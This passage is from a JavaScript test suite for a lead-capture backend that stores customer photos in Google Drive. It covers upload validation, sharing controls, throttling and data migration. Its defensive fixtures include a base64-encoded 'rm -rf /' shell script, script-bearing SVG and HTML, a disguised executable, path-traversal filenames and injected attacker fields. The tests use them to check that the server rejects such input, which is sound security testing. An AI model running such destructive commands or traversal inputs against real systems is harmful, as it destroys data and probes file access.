        fileName: fileName,

        mimeType: 'image/jpeg',

        dataBase64: onePixelPng

    };

    Object.keys(overrides || {}).forEach(function (key) { payload[key] = overrides[key]; });

    return parse(sandbox.doPost({

        parameter: { action: 'leads.addPhotos' },

        postData: { contents: JSON.stringify(payload) }

    }));

}

const photoReference = 'BG-' + (Date.now() + 201);

const upload1 = uploadPhoto(photoReference, 1, 'frontField.jpg');

const upload2 = uploadPhoto(photoReference, 2, 'backLot.jpg');

check('photo upload succeeds', upload1.success === true, JSON.stringify(upload1.error || {}));

check('upload returns a usable url', /^https:\/\/drive\.google\.com\/file\//.test(upload1.data.photo.url));

check('multiple photos land in one folder', upload2.success === true);

check('stored name carries its position', upload1.data.photo.name === '01-frontField.jpg'
    && upload2.data.photo.name === '02-backLot.jpg');

/* ── Idempotency: a retried upload must not store a second copy ── */

const reupload = uploadPhoto(photoReference, 1, 'frontField.jpg');

check('re-uploading the same photo is idempotent',
    reupload.success === true
    && reupload.data.duplicate === true
    && reupload.data.photo.fileId === upload1.data.photo.fileId);

/* ── The lead picks up what was actually stored ── */

sentEmails.length = 0;

const photoLead = createLead({

    referenceId: photoReference,

    photoCount: 2,

    photoNames: ['frontField.jpg', 'backLot.jpg']

});

check('lead stores the resolved photo urls',
    photoLead.data.lead.photoUrls.length === 2
    && photoLead.data.lead.photoUrls[0] === upload1.data.photo.url);

check('photo urls are ordered as the visitor chose them',
    photoLead.data.lead.photoNames[0] === '01-frontField.jpg'
    && photoLead.data.lead.photoNames[1] === '02-backLot.jpg');

check('lead stores a folder url', /drive\.google\.com\/drive\/folders\//
    .test(photoLead.data.lead.photoFolderUrl));

const photoOwnerEmail = sentEmails[0];

check('owner email links every photo',
    photoOwnerEmail.body.indexOf(upload1.data.photo.url) !== -1
    && photoOwnerEmail.body.indexOf(upload2.data.photo.url) !== -1);

check('owner email names photos without the position prefix',
    photoOwnerEmail.body.indexOf('1. frontField.jpg') !== -1
    && photoOwnerEmail.body.indexOf('2. backLot.jpg') !== -1);

check('owner email offers the whole folder',
    photoOwnerEmail.body.indexOf(photoLead.data.lead.photoFolderUrl) !== -1);

check('owner HTML email carries real anchors',
    photoOwnerEmail.htmlBody.indexOf('<a href="' + upload1.data.photo.url) !== -1);

/* The defect this whole feature exists to remove: an email that names
   a photo the owner cannot open. */

check('owner email no longer says photos are not uploaded',
    photoOwnerEmail.body.indexOf('photos are not uploaded yet') === -1
    && photoOwnerEmail.htmlBody.indexOf('recorded by name only') === -1);

check('the folder was renamed to carry the lead number',
    Boolean(findMockFolderById(photoLead.data.lead.photoFolderUrl.split('/').pop()))
    && findMockFolderById(photoLead.data.lead.photoFolderUrl.split('/').pop())
        .getName().indexOf(photoLead.data.lead.leadId) === 0);

/* ── Access model: rootInherited (approved 2026-08-15) ──

   This block used to assert the opposite — that every lead folder was
   shared with the notification recipient. That per-lead grant is what
   the root-inheritance model removed, so the assertion is inverted
   rather than deleted: a submission that shares anything is now the
   regression. */

check('a customer submission performs NO per-lead sharing call',
    driveSharingCalls.length === 0,
    JSON.stringify(driveSharingCalls));

check('no lead folder was shared with an individual account',
    !driveSharingCalls.some(function (call) { return Boolean(call.viewer); }));

check('nothing was shared publicly',
    !driveSharingCalls.some(function (call) { return call.access === 'ANYONE_WITH_LINK'; }));

check('the lead folder still received both uploaded photos',
    photoLead.data.lead.photoUrls.length === 2
    && photoLead.data.lead.photoUrls[0] === upload1.data.photo.url
    && photoLead.data.lead.photoUrls[1] === upload2.data.photo.url,
    JSON.stringify(photoLead.data.lead.photoUrls));

check('an individual photo URL was still generated',
    /^https:\/\/drive\.google\.com\/file\/d\//.test(photoLead.data.lead.photoUrls[0]),
    photoLead.data.lead.photoUrls[0]);

check('"Open all photos" still points at this lead\'s own folder',
    photoLead.data.lead.photoFolderUrl
    === findMockFolderById(photoLead.data.lead.photoFolderUrl.split('/').pop()).getUrl());

/* ── notificationEmail and photoViewerEmail are independent ── */

check('notification recipient is unchanged by the access model',
    photoOwnerEmail.to === 'Bluegridls@gmail.com',
    photoOwnerEmail.to);

check('photoViewerEmail defaults blank and is NOT the notification address',
    sandbox.constants.DEFAULT_PHOTO_VIEWER_EMAIL === ''
    && sandbox.constants.DEFAULT_PHOTO_VIEWER_EMAIL !== sandbox.constants.DEFAULT_NOTIFICATION_EMAIL);

check('the two keys resolve independently from the config tab',
    (function ()
    {

        setConfigValue('notificationEmail', 'notify@example.com');
        setConfigValue('photoViewerEmail', 'viewer@example.com');

        const resolved = readFreshConfig();

        setConfigValue('notificationEmail', 'Bluegridls@gmail.com');
        setConfigValue('photoViewerEmail', '');

        return resolved.notificationEmail === 'notify@example.com'
            && resolved.photoViewerEmail === 'viewer@example.com';

    })());

/* ── shareRootFolderWithOwner(): scope, idempotency, loud failure ── */

check('shareRootFolderWithOwner refuses to run with a blank photoViewerEmail',
    (function ()
    {

        setConfigValue('photoViewerEmail', '');

        try
        {

            sandbox.shareRootFolderWithOwner();

            return false;

        }
        catch (expected)
        {

            return String(expected.message).indexOf('photoViewerEmail is blank') !== -1;

        }

    })());

check('shareRootFolderWithOwner rejects a malformed address',
    (function ()
    {

        setConfigValue('photoViewerEmail', 'not-an-email');

        try
        {

            sandbox.shareRootFolderWithOwner();

            return false;

        }
        catch (expected)
        {

            return String(expected.message).indexOf('not a valid email') !== -1;

        }

    })());

driveSharingCalls.length = 0;

const shareReport = (function ()
{

    setConfigValue('photoViewerEmail', 'chase@example.com');

    return sandbox.shareRootFolderWithOwner();

})();

check('shareRootFolderWithOwner grants Viewer to photoViewerEmail',
    driveSharingCalls.some(function (call) { return call.viewer === 'chase@example.com'; }));

check('it targets ONLY the BlueGrid photo root',
    driveSharingCalls.every(function (call)
    {

        return call.folder === sandbox.constants.PHOTO_ROOT_FOLDER_NAME;

    }),
    JSON.stringify(driveSharingCalls));

check('no lead folder was touched by the root share',
    !driveSharingCalls.some(function (call)
    {

        return String(call.folder).indexOf('BG-') === 0;

    }));

check('the report names the folder and the account',
    shareReport.indexOf(sandbox.constants.PHOTO_ROOT_FOLDER_NAME) !== -1
    && shareReport.indexOf('chase@example.com') !== -1);

check('re-running is idempotent — no second grant',
    (function ()
    {

        driveSharingCalls.length = 0;

        const second = sandbox.shareRootFolderWithOwner();

        return driveSharingCalls.length === 0
            && second.indexOf('ALREADY SHARED') === 0;

    })());

check('listRootFolderAccess reports the granted viewer',
    sandbox.listRootFolderAccess().indexOf('chase@example.com') !== -1);

/* The documented swap: point photoViewerEmail at the incoming account,
   share, then revoke — which removes everyone the config no longer
   names, without anyone having to type the outgoing address. */

check('swapping accounts grants the incoming one',
    (function ()
    {

        setConfigValue('photoViewerEmail', 'newowner@example.com');

        sandbox.shareRootFolderWithOwner();

        return sandbox.listRootFolderAccess().indexOf('newowner@example.com') !== -1;

    })());

check('revokeRootFolderViewer drops the outgoing account and keeps the configured one',
    (function ()
    {

        const report = sandbox.revokeRootFolderViewer();

        const access = sandbox.listRootFolderAccess();

        return report.indexOf('chase@example.com') !== -1
            && access.indexOf('chase@example.com') === -1
            && access.indexOf('newowner@example.com') !== -1;

    })());

check('revoking twice is safe',
    sandbox.revokeRootFolderViewer().indexOf('NOTHING TO REVOKE') === 0);

check('a blank photoViewerEmail revokes everyone',
    (function ()
    {

        setConfigValue('photoViewerEmail', '');

        sandbox.revokeRootFolderViewer();

        return sandbox.listRootFolderAccess().indexOf('newowner@example.com') === -1;

    })());

check('revokeRootFolderViewer never touches a lead folder',
    !driveSharingCalls.some(function (call)
    {

        return call.removedViewer && String(call.folder).indexOf('BG-') === 0;

    }),
    JSON.stringify(driveSharingCalls.filter(function (c) { return c.removedViewer; })));

setConfigValue('photoViewerEmail', '');

driveSharingCalls.length = 0;

/* ── A lead whose photos never arrived must say so ── */

sentEmails.length = 0;

const noPhotoLead = createLead({

    referenceId: 'BG-' + (Date.now() + 211),

    photoCount: 3,

    photoNames: ['a.jpg', 'b.jpg', 'c.jpg']

});

check('lead still succeeds when no photo reached storage', noPhotoLead.success === true);

check('owner told plainly that the upload did not complete',
    sentEmails[0].body.indexOf('UPLOAD DID NOT COMPLETE') !== -1
    && sentEmails[0].body.indexOf('a.jpg') !== -1);

/* ── Public endpoint, so its gates are the control ── */

const badMime = uploadPhoto('BG-' + (Date.now() + 221), 1, 'notes.pdf', {

    mimeType: 'application/pdf'

});

check('non-image upload rejected', badMime.success === false
    && Boolean(badMime.error.fields.mimeType));

const staleReference = uploadPhoto('BG-' + (Date.now() - (48 * 60 * 60 * 1000)), 1, 'old.jpg');

check('expired reference rejected', staleReference.success === false
    && Boolean(staleReference.error.fields.referenceId));

/* ============================================================
   UPLOAD POLICY  (production hardening, 2026-08-15)

   Everything here posts straight at doPost, bypassing the browser
   entirely — which is the only way to test the controls that matter.
   A protection that exists only in indexJS.js is not a protection.
============================================================ */

/* ── fixtures: real leading bytes for each format and each threat ── */

function base64FromBytes(bytes)
{

    return Buffer.from(bytes).toString('base64');

}

function padTo(bytes, total)
{

    const out = bytes.slice();

    while (out.length < total) { out.push(0x00); }

    return out;

}

const fixtures = {

    jpeg: base64FromBytes(padTo([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46], 64)),

    png: onePixelPng,

    webp: base64FromBytes(padTo(
        [0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50], 64)),

    heic: base64FromBytes(padTo(
        [0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x68, 0x65, 0x69, 0x63], 64)),

    /* MZ — a Windows executable renamed and declared as a photo. */
    exe: base64FromBytes(padTo([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00], 64)),

    svg: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>').toString('base64'),

    html: Buffer.from('<!DOCTYPE html><html><body><script>alert(1)</script></body></html>').toString('base64'),

    pdf: base64FromBytes(padTo([0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x37], 64)),

    zip: base64FromBytes(padTo([0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00], 64)),

    gif: base64FromBytes(padTo([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00], 64)),

    shell: Buffer.from('#!/bin/sh\nrm -rf /\n').toString('base64')

};

/* ── accepted formats ── */

[
    ['JPEG', 'jpeg', 'image/jpeg'],
    ['PNG', 'png', 'image/png'],
    ['WebP', 'webp', 'image/webp'],
    ['HEIC', 'heic', 'image/heic']
].forEach(function (entry, position)
{

    const result = uploadPhoto('BG-' + (Date.now() + 400 + position), 1, 'photo.img', {
        mimeType: entry[2],
        dataBase64: fixtures[entry[1]]
    });

    check('accepted format: ' + entry[0], result.success === true,
        JSON.stringify(result.error || {}));

});

check('HEIF may declare the shared HEIC container',
    uploadPhoto('BG-' + (Date.now() + 410), 1, 'p.heif', {
        mimeType: 'image/heif',
        dataBase64: fixtures.heic
    }).success === true);

/* ── disguised and dangerous content ── */

const disguised = [
    ['.exe renamed .jpg and declared image/jpeg', 'exe'],
    ['SVG (scriptable markup)', 'svg'],
    ['HTML with script', 'html'],
    ['PDF', 'pdf'],
    ['ZIP archive', 'zip'],
    ['GIF (not an accepted format)', 'gif'],
    ['shell script', 'shell']
];

disguised.forEach(function (entry, position)
{

    const reference = 'BG-' + (Date.now() + 500 + position);

    const result = uploadPhoto(reference, 1, 'holiday.jpg', {
        mimeType: 'image/jpeg',
        dataBase64: fixtures[entry[1]]
    });

    check('rejected by content inspection: ' + entry[0],
        result.success === false && Boolean(result.error.fields.dataBase64),
        JSON.stringify(result.error || {}));

    check('  ...and nothing reached Drive for it',
        countFilesUnderReference(reference) === 0);

});

/* ── malformed and missing metadata ── */

check('malformed base64 rejected cleanly, not as a server error',
    (function ()
    {

        const result = uploadPhoto('BG-' + (Date.now() + 600), 1, 'x.jpg', {
            dataBase64: 'not!valid!base64!!'
        });

        return result.success === false
            && result.error.code === 'VALIDATION_ERROR'
            && Boolean(result.error.fields.dataBase64);

    })());

check('empty payload rejected',
    uploadPhoto('BG-' + (Date.now() + 601), 1, 'x.jpg', { dataBase64: '' }).success === false);

check('missing MIME metadata is handled safely when the bytes are a real image',
    (function ()
    {

        const result = uploadPhoto('BG-' + (Date.now() + 602), 1, 'nomime.png', {
            mimeType: '',
            dataBase64: fixtures.png
        });

        return result.success === true;

    })());

check('a non-image MIME claim is still refused outright',
    uploadPhoto('BG-' + (Date.now() + 603), 1, 'notes.pdf', {
        mimeType: 'application/pdf',
        dataBase64: fixtures.png
    }).success === false);

/* ── count and size caps ── */

const photoCapReference = 'BG-' + (Date.now() + 700);

for (let index = 1; index <= 5; index += 1)
{

    check('photo ' + index + ' of 5 accepted',
        uploadPhoto(photoCapReference, index, 'p' + index + '.png').success === true);

}

const sixth = uploadPhoto(photoCapReference, 6, 'p6.png');

check('the 6th photo is refused',
    sixth.success === false && Boolean(sixth.error.fields.index));

check('the 6th photo never reached Drive',
    countFilesUnderReference(photoCapReference) === 5);

check('an oversized single photo is refused',
    (function ()
    {

        /* Just over 8MB decoded, without allocating 8MB of real image:
           the size gate reads the base64 length, which is what a real
           oversized upload would present. */

        const oversized = 'A'.repeat(Math.ceil((sandbox.constants.MAX_PHOTO_BYTES + 4096) / 3) * 4);

        const result = uploadPhoto('BG-' + (Date.now() + 800), 1, 'huge.jpg', {
            dataBase64: oversized
        });

        return result.success === false && Boolean(result.error.fields.dataBase64);

    })());

check('combined payload over 25MB is refused across separate requests',
    (function ()
    {

        const reference = 'BG-' + (Date.now() + 900);

        /* Each photo is its own POST, so no single request can see the
           total — the cap has to come from the folder's real contents.
           Four at ~7MB pass, the fifth would cross 25MB. */

        const sevenMegabytes = base64FromBytes(padTo(
            [0xFF, 0xD8, 0xFF, 0xE0], 7 * 1024 * 1024));

        let accepted = 0;

        let refused = null;

        for (let index = 1; index <= 5; index += 1)
        {

            const result = uploadPhoto(reference, index, 'big' + index + '.jpg', {
                dataBase64: sevenMegabytes
            });

            if (result.success) { accepted += 1; }
            else if (!refused) { refused = result; }

        }

        return accepted === 3
            && refused
            && refused.success === false
            && Boolean(refused.error.fields.dataBase64)
            && countFilesUnderReference(reference) === 3;

    })());

/* ── a rejected photo must never cost the lead ── */

sentEmails.length = 0;

const rejectedPhotoReference = 'BG-' + (Date.now() + 1000);

uploadPhoto(rejectedPhotoReference, 1, 'malware.jpg', {
    mimeType: 'image/jpeg',
    dataBase64: fixtures.exe
});

const leadDespiteRejection = createLead({

    referenceId: rejectedPhotoReference,

    photoCount: 1,

    photoNames: ['malware.jpg']

});

check('a rejected photo does not destroy the lead',
    leadDespiteRejection.success === true,
    JSON.stringify(leadDespiteRejection.error || {}));

check('the rejected file is absent from Drive',
    countFilesUnderReference(rejectedPhotoReference) === 0);

check('the owner is told the photo did not arrive',
    sentEmails[0].body.indexOf('UPLOAD DID NOT COMPLETE') !== -1);

check('no internal detail leaks to the customer',
    (function ()
    {

        const result = uploadPhoto('BG-' + (Date.now() + 1100), 1, 'x.jpg', {
            dataBase64: fixtures.exe
        });

        const text = JSON.stringify(result);

        /* Deliberately specific. An earlier version of this check
           searched for "at " to catch stack frames and failed on the
           word "That" in a perfectly clean message — a test that
           rejects correct behaviour is worse than no test. */

        const leaks = [
            'Drive', 'DriveApp', 'executable', 'Windows', 'folder', 'Folder',
            'stack', 'Exception', 'googleapis.com', 'script.google.com',
            'photoViewerEmail', 'notificationEmail', 'BlueGrid Lead Photos',
            '.gs:', '\\n    at '
        ];

        return leaks.every(function (needle) { return text.indexOf(needle) === -1; });

    })());

/* ── customer input cannot influence storage location or sharing ── */

driveSharingCalls.length = 0;

check('a traversal filename cannot escape the lead folder',
    (function ()
    {

        const reference = 'BG-' + (Date.now() + 1200);

        const result = uploadPhoto(reference, 1, '../../../../etc/passwd.png');

        if (!result.success) { return false; }

        const stored = result.data.photo.name;

        return stored.indexOf('/') === -1
            && stored.indexOf(String.fromCharCode(92)) === -1
            && stored.indexOf('..') !== 0
            && countFilesUnderReference(reference) === 1;

    })());

check('a customer payload cannot name its own Drive folder or ids',
    (function ()
    {

        const reference = 'BG-' + (Date.now() + 1300);

        const result = uploadPhoto(reference, 1, 'ok.png', {
            folderId: 'attacker-folder',
            photoFolderUrl: 'https://drive.google.com/attacker',
            photoViewerEmail: 'attacker@example.com',
            photoAccess: 'anyoneWithLink'
        });

        return result.success === true
            && driveSharingCalls.length === 0
            && readFreshConfig().photoViewerEmail !== 'attacker@example.com';

    })());

check('no customer upload triggered any sharing call',
    driveSharingCalls.length === 0, JSON.stringify(driveSharingCalls));

check('the administrative helpers are unreachable over HTTP',
    ['shareRootFolderWithOwner', 'revokeRootFolderViewer', 'listRootFolderAccess']
        .every(function (action)
        {

            const viaPost = parse(sandbox.doPost({
                parameter: { action: action },
                postData: { contents: '{}' }
            }));

            const viaGet = parse(sandbox.doGet({ parameter: { action: action } }));

            return viaPost.success === false
                && viaGet.success === false
                && viaPost.error.code === 'UNKNOWN_ACTION';

        }));

/* ── throttle ── */

check('the global upload throttle refuses a flood and then recovers',
    (function ()
    {

        Object.keys(cacheStore).forEach(function (key) { delete cacheStore[key]; });

        setConfigValue('photoUploadsPerHour', '3');

        const reference = 'BG-' + (Date.now() + 1400);

        const outcomes = [];

        for (let index = 1; index <= 5; index += 1)
        {

            outcomes.push(uploadPhoto(reference, index, 't' + index + '.png').success);

        }

        const throttled = outcomes.filter(function (ok) { return ok === false; }).length;

        Object.keys(cacheStore).forEach(function (key) { delete cacheStore[key]; });

        setConfigValue('photoUploadsPerHour', String(sandbox.constants.DEFAULT_PHOTO_UPLOADS_PER_HOUR));

        const afterReset = uploadPhoto('BG-' + (Date.now() + 1500), 1, 'after.png');

        return throttled === 2 && afterReset.success === true;

    })());

const malformedReference = uploadPhoto('BG-not-a-reference', 1, 'x.jpg');

check('malformed reference rejected', malformedReference.success === false
    && Boolean(malformedReference.error.fields.referenceId));

const oversized = uploadPhoto('BG-' + (Date.now() + 231), 1, 'huge.jpg', {

    dataBase64: 'A'.repeat(Math.ceil(sandbox.constants.MAX_PHOTO_BYTES * 4 / 3) + 1024)

});

check('oversized upload rejected', oversized.success === false
    && Boolean(oversized.error.fields.dataBase64));

const traversalReference = 'BG-' + (Date.now() + 241);

const traversal = uploadPhoto(traversalReference, 1, '../../etc/passwd.jpg');

check('path separators stripped from the stored name',
    traversal.success === true
    && traversal.data.photo.name.indexOf('/') === -1
    && traversal.data.photo.name.indexOf('\\') === -1,
    traversal.success ? traversal.data.photo.name : JSON.stringify(traversal.error));

const capReference = 'BG-' + (Date.now() + 251);

let capRejected = false;

for (let photoIndex = 1; photoIndex <= sandbox.constants.MAX_PHOTOS_PER_LEAD + 2; photoIndex += 1)
{

    const attempt = uploadPhoto(capReference, photoIndex, 'photo' + photoIndex + '.jpg');

    if (!attempt.success)
    {

        capRejected = true;

    }

}

check('per-lead photo cap enforced server-side', capRejected);

check('cap stopped the folder at the limit',
    sandbox.countFolderFiles(sandbox.getLeadPhotoFolder(capReference, false))
        === sandbox.constants.MAX_PHOTOS_PER_LEAD);

/* ============================================================
   IDENTIFIER MIGRATION
============================================================ */

console.log('\nIDENTIFIER MIGRATION');

/* A pre-split row, written the way the old code wrote it: long id in
   the leadId column, referenceId empty. */

const legacyReference = 'BG-1786635839698';

const legacySheet = leadsSheet();

const legacyRowNumber = legacySheet.getLastRow() + 1;

const legacyRow = sandbox.constants.LEADS_HEADERS.map(function (header)
{

    if (header === 'leadId') { return legacyReference; }

    if (header === 'fullName') { return 'Legacy Row'; }

    if (header === 'status') { return 'new'; }

    return '';

});

legacySheet.appendRow(legacyRow);

const rowsBeforeMigration = legacySheet.getLastRow();

const previewOutput = sandbox.previewLeadIdentifierMigration();

check('preview reports the legacy row', previewOutput.indexOf(legacyReference) !== -1);

check('preview writes nothing',
    legacySheet.getRange(legacyRowNumber, 1, 1, 1).getValues()[0][0] === legacyReference
    && legacySheet.getLastRow() === rowsBeforeMigration);

const migrationOutput = sandbox.migrateLeadIdentifiers();

const migratedRecord = sandbox.findLeadByReferenceId(legacySheet, legacyReference);

check('migration moved the long id into referenceId',
    Boolean(migratedRecord) && migratedRecord.record.referenceId === legacyReference);

check('migration gave the row a sequential leadId',
    Boolean(migratedRecord) && sandbox.isValidLeadId(migratedRecord.record.leadId),
    migratedRecord ? migratedRecord.record.leadId : 'not found');

check('migration deleted no rows', legacySheet.getLastRow() === rowsBeforeMigration);

check('migration preserved the rest of the row',
    Boolean(migratedRecord) && migratedRecord.record.fullName === 'Legacy Row');

check('migration reported what it did', migrationOutput.indexOf('MIGRATION APPLIED') !== -1);

/* Idempotence matters more here than anywhere else: someone will run
   this twice. */

const afterFirstMigration = sandbox.findLeadByReferenceId(legacySheet, legacyReference).record.leadId;

sandbox.migrateLeadIdentifiers();

check('re-running the migration changes nothing',
    sandbox.findLeadByReferenceId(legacySheet, legacyReference).record.leadId === afterFirstMigration
    && legacySheet.getLastRow() === rowsBeforeMigration);

check('a migrated sheet still numbers new leads correctly',
    sandbox.parseLeadNumber(createLead({ referenceId: 'BG-' + (Date.now() + 301) })
        .data.lead.leadId) > 0);

console.log('\nBUILT-IN SELF TEST');

const selfTestOutput = sandbox.runSelfTest();

console.log(selfTestOutput.split('\n').map(function (line) { return '        ' + line; }).join('\n'));

check('runSelfTest reports no failures', selfTestOutput.indexOf('FAIL') === -1, selfTestOutput);

/* ============================================================
   SUMMARY
============================================================ */

console.log('\n' + '='.repeat(46));

console.log('  passed: ' + passed + '   failed: ' + failed);

console.log('='.repeat(46) + '\n');

process.exit(failed === 0 ? 0 : 1);
